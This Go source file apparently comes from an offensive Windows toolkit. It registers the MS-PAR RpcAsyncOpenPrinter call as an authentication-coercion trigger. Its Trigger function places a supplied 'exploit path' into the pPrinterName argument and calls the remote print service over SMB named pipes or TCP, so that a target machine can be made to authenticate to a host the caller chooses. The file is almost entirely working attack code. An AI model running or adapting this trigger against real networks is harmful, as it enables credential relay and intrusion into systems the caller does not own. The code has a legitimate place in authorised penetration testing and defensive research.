package methods

import (
	IRemoteWinspool "github.com/TheManticoreProject/Manticore/network/dcerpc/interfaces/76f03f96-cdfd-44fc-a22c-64950a001209/1.0"
	parFunctions "github.com/TheManticoreProject/Manticore/network/dcerpc/interfaces/76f03f96-cdfd-44fc-a22c-64950a001209/1.0/functions"
	"github.com/TheManticoreProject/Manticore/network/dcerpc/ndr"
	"github.com/TheManticoreProject/Manticore/network/dcerpc/syntax"
	mspar "github.com/TheManticoreProject/Manticore/windows/protocols/ms-par"
)

// --- Op 0: RpcAsyncOpenPrinter ---

type rpcAsyncOpenPrinterRequest struct {
	PPrinterName      *ndr.WSTR `ndr:"unique"`
	PDatatype         *ndr.WSTR `ndr:"unique"`
	PDevModeContainer mspar.DEVMODE_CONTAINER
	AccessRequired    ndr.DWORD
	PClientInfo       mspar.SPLCLIENT_CONTAINER
}

func (*rpcAsyncOpenPrinterRequest) Opnum() uint16 { return IRemoteWinspool.OpnumRpcAsyncOpenPrinter }

type rpcAsyncOpenPrinterResponse struct {
	PHandle mspar.PRINTER_HANDLE
	Status  ndr.DWORD `ndr:"retval"`
}

func parAccess() []Access {
	syntaxes := []syntax.SyntaxID{IRemoteWinspool.SyntaxID()}
	return []Access{
		{Transport: TransportNamedPipe, Pipe: IRemoteWinspool.PipeName, Syntaxes: syntaxes, DefaultAuth: RPCAuthNTLMPrivacy},
		{Transport: TransportTCP, Syntaxes: syntaxes, DefaultAuth: RPCAuthNTLMPrivacy},
	}
}

func registerPAR(r *Registry) {
	access := parAccess()
	paths := rprnPaths()

	r.Register(Method{
		Protocol: "MS-PAR", ProtocolLong: "Print System Asynchronous Remote",
		Function: "RpcAsyncOpenPrinter", Opnum: IRemoteWinspool.OpnumRpcAsyncOpenPrinter,
		VulnerableArgs: []string{"pPrinterName"}, Access: access, ExploitPaths: paths,
		Trigger: func(rpc ndr.Invoker, target, exploitPath string) TriggerResult {
			printerName := ndr.WSTR(exploitPath)
			req := &rpcAsyncOpenPrinterRequest{
				PPrinterName:      &printerName,
				PDevModeContainer: mspar.DEVMODE_CONTAINER{},
				AccessRequired:    0x00020002,
				PClientInfo: mspar.SPLCLIENT_CONTAINER{
					Level: 1,
					ClientInfo: mspar.SPLCLIENT_CONTAINER_ClientInfo{
						Tag:          1,
						PClientInfo1: &mspar.SPLCLIENT_INFO_1{},
					},
				},
			}
			var resp rpcAsyncOpenPrinterResponse
			if err := rpc.Invoke(req, &resp); err != nil {
				return TriggerResult{Faulted: true, Err: err}
			}
			if uint32(resp.Status) == 0 {
				_, _ = parFunctions.RpcAsyncClosePrinter(rpc, resp.PHandle)
			}
			return TriggerResult{Status: uint32(resp.Status)}
		},
	})
}
